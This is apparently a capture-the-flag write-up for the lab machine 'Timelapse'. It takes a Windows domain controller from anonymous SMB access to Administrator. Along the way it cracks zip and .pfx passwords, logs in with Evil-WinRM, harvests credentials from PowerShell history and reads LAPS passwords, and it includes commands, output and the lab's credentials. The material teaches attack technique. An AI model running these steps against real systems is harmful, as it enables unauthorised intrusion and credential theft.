# Timelapse

---

## Enumeration

- nmap:

```
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-12 18:32:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Samba

- Allows anon access

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share
```

- Shares has winrm_backup.zip file, and MS Word docs
- Cracked .zip file password: `supremelegacy`
- .pfx certificate file?
- using openssl to read the certificate: http://www.freekb.net/Article?id=2460

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -info
```

- Needs password, crack it with John
- pfx password cracked : `thuglegacy`
- extract key:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

- extract cert:

```zsh
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

---

## Lateral Movement

- Connect using `evil-wirm` using the certificate and private key we got

```zsh
└─$ evil-winrm -S -k key.pem -c cert.pem -i $IP  

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

---

## PrivEsc

- Found creds in `C:\Users\legacyy\appdata\Roaming\Microsoft\windows\powershell\psreadline\ConsoleHost_history.txt`

```bash
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

- creds: `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`

```zsh
evil-winrm -S -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i $IP
```

- Now I'm part of LAPS_Readers I can read user password:

```zsh
Get-ADComputer -Filter * -Property ms-Mcs-AdmPwd
```

- Password: `}tT.mPr7Up0527}sN3[9D7Ew`
- Login as admin:

```zsh
evil-winrm -S -i $IP -u "Administrator" -p '}tT.mPr7Up0527}sN3[9D7Ew'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

- Root flag wasnt in administrator's desktop:

```zsh
*Evil-WinRM* PS C:\Users\Administrator> Get-ChildItem -Path C:\ -Recurse -force -ErrorAction SilentlyContinue -Include root.txt
```

- Found in `C:\Users\TRX\Desktop\root.txt`

---

